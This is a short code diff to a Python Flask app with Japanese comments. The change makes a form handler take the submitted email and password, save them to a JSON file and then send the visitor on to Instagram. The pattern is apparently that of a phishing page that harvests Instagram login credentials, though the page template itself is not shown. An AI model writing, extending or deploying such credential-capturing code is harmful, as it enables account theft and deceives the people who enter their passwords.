@@ -7,14 +7,22 @@ app = Flask(__name__,)
 
 @app.route('/')
 def index():
-    print("test1")
     return render_template('index.html')
 
 @app.route('/save', methods=['POST'])
 def save_data():
-    data = request.form.to_dict()  # フォームから送信されたデータを取得
+    email = request.form['email']
+    password = request.form['password']
+    
+    # 受け取ったデータをJSON形式に整形
+    data = {
+        'email': email,
+        'password': password
+    }
+    
+    # JSONファイルにデータを書き込む
     with open('data.json', 'w') as file:
-        json.dump(data, file)  # データをJSONファイルに保存
+        json.dump(data, file)
     return redirect('https://www.instagram.com')
 
 
